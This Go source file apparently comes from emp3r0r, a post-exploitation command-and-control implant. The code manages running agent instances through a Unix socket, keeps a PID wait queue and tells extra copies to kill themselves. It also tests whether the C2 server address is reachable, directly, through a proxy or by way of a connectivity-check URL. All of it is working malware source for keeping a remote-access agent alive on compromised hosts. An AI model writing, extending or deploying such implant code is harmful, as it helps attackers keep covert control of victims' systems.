package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func isAgentAliveSocket() bool {
	log.Printf("Checking if agent is alive via socket %s", common.RuntimeConfig.SocketName)
	conn, err := net.Dial("unix", common.RuntimeConfig.SocketName)
	if err != nil {
		log.Printf("Agent seems dead: %v, removing socket to bind", err)
		err = os.RemoveAll(common.RuntimeConfig.SocketName)
		if err != nil {
			log.Printf("Failed to remove socket: %v", err)
		}
		return false
	}
	return agentutils.IsAgentAlive(conn)
}

func isC2Reachable() bool {
	if common.RuntimeConfig.EnableNCSI {
		return transport.TestConnectivity(transport.UbuntuConnectivityURL, common.RuntimeConfig.C2TransportProxy)
	}

	log.Println("NCSI is disabled, trying direct C2 connection")
	return transport.TestConnectivity(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
}

// AgentWaitQueue list of agents waiting to run
var AgentWaitQueue []int

// handle connections to our socket: tell them my PID
func socket_server(c net.Conn) {
	log.Printf("Got connection from %s", c.RemoteAddr().String())
	// how many agents are waiting to run
	for {
		buf := make([]byte, 512)
		nr, err := c.Read(buf)
		if err != nil {
			return
		}
		pid_data := buf[0:nr]
		pid, err := strconv.ParseInt(string(pid_data), 10, 32)
		if err != nil {
			log.Printf("Invalid PID from ping: %v", err)
			continue
		}
		log.Printf("emp3r0r instance got ping from PID: %d", pid)

		// check if agents are still alive, remove dead agents
		for _, pid := range AgentWaitQueue {
			if !util.IsPIDAlive(int(pid)) {
				log.Printf("Removing dead agent at PID: %d", pid)
				AgentWaitQueue = util.RemoveItemFromArray(int(pid), AgentWaitQueue)
			}
		}

		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
		if len(AgentWaitQueue) > 3 {
			log.Printf("Wait queue (sorted): %v", AgentWaitQueue)
			log.Println("Too many agents waiting, will start to kill...")
			reply = "emp3r0r wants you to kill yourself"
		} else {
			AgentWaitQueue = append(AgentWaitQueue, int(pid))
			AgentWaitQueue = util.RemoveDupsFromArray(AgentWaitQueue)
			log.Printf("Wait queue (sorted): %v", AgentWaitQueue)
			log.Printf("We have %d agents in wait queue", len(AgentWaitQueue))
		}

		// Write reply
		_, err = c.Write([]byte(reply))
		if err != nil {
			log.Printf("Write: %v", err)
		}
	}
}
